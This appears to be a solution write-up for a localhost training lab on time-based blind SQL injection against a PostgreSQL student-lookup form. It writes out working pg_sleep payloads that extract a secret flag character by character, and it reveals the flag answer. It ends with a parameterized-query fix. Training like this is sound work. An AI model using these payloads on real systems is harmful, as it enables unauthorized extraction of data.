# Lab 05 Solution: UniPortal Night Registrar

## Goal

Recover the hidden flag from `uni_flags`.

Expected final value:

```text
FLAG{time_waits_for_no_admin}
```

## Step 1: Establish A Baseline

Open:

```text
http://localhost:3000/lab/05-time-based/courses
```

Submit:

```text
STU-2024-001
```

The response should be fast and show `Record found`.

Submit:

```text
STU-0000-000
```

This should also be fast, but show `No record`.

## Step 2: Prove A Conditional Delay

Use a valid student number, close the string, add a conditional delay, and
comment out the trailing quote:

```sql
STU-2024-001' AND 1=(SELECT CASE WHEN 'a'='a' THEN (SELECT 1 FROM pg_sleep(3)) ELSE 1 END) --
```

The response should take about three seconds.

Now test a false condition:

```sql
STU-2024-001' AND 1=(SELECT CASE WHEN 'a'='b' THEN (SELECT 1 FROM pg_sleep(3)) ELSE 1 END) --
```

This should return quickly.

## Step 3: Extract The First Flag Character

Test whether the first character is `F`:

```sql
STU-2024-001' AND 1=(SELECT CASE WHEN SUBSTRING((SELECT flag_value FROM uni_flags WHERE flag_name='REGISTRAR_NIGHT_FLAG'),1,1)='F' THEN (SELECT 1 FROM pg_sleep(3)) ELSE 1 END) --
```

If the response is delayed, the character is correct.

## Step 4: Repeat Character By Character

Change the position and tested character:

```sql
STU-2024-001' AND 1=(SELECT CASE WHEN SUBSTRING((SELECT flag_value FROM uni_flags WHERE flag_name='REGISTRAR_NIGHT_FLAG'),2,1)='L' THEN (SELECT 1 FROM pg_sleep(3)) ELSE 1 END) --
```

Continue until you recover:

```text
FLAG{time_waits_for_no_admin}
```

## Why It Works

The vulnerable query is:

```sql
SELECT *
FROM uni_students
WHERE student_number='<input>';
```

The payload appends a condition that always returns `1`, but only after sleeping
when the tested secret character is correct.

## Secure Fix

Use a parameterized query:

```ts
await pool.query(
  "SELECT * FROM uni_students WHERE student_number = $1",
  [studentNumber]
);
```

The database should receive the student number as data, never as executable SQL.
